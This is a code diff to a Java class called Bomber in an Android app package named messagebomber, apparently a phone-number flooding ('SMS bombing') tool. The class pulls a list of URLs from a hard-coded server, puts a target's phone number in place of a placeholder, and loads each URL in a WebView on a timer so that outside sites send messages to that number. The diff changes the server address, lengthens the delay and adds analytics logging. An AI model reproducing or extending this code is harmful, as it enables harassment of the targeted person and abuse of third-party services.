@@ -9,8 +9,12 @@ import java.io.StreamCorruptedException;
 import java.net.Socket;
 import java.net.URL;
 import java.net.UnknownHostException;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 import org.json.JSONArray;
 import com.example.messagebomber.R.string;
+import com.umeng.analytics.MobclickAgent;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
@@ -43,7 +47,7 @@ public class Bomber extends Thread {
 	public void run() {
 		Socket socket = null;
 		try {
-			socket = new Socket("192.168.1.100", 9999);
+			socket = new Socket("192.168.43.33", 9999);
 	
 		} catch (UnknownHostException e) {
 			// TODO Auto-generated catch block
@@ -60,12 +64,15 @@ public class Bomber extends Thread {
 				// TODO Auto-generated catch block
 				e1.printStackTrace();
 			}			
+			if(contentString.equals("")){
+				
+			}
 			String finalString = replaceString(contentString, "13538805451", phoneNumber);
-		//	System.out.println(finalString);
+	//		System.out.println(finalString);
 			a = finalString.split("\\*");
 			bomb(webView, a[0]);
 			try {
-				sleep(3000);
+				sleep(5000);
 			} catch (InterruptedException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
@@ -78,12 +85,18 @@ public class Bomber extends Thread {
 			public void onPageFinished(WebView webView, String url) {
 				super.onPageFinished(webView, url);
 				webView.loadUrl(a[a.length-1]);
-			//	System.out.println("url:"+a[0]);
+				System.out.println("这是url:"+a[0]);
 			//	System.out.println("url:"+a[a.length-1]);
 			}
 		});
 
 		webView.loadUrl(url);
+		String testreg = "[^a-zA-Z\\s]";
+	    Pattern matchsip = Pattern.compile(testreg);
+	    Matcher mp = matchsip.matcher(url);
+	    url = mp.replaceAll("");
+	    MobclickAgent.onEvent(context, url);
+	    System.out.println("这是URL使用了的标签："+url);
 	}
 
 	public static String replaceString(String src, String before, String after) {
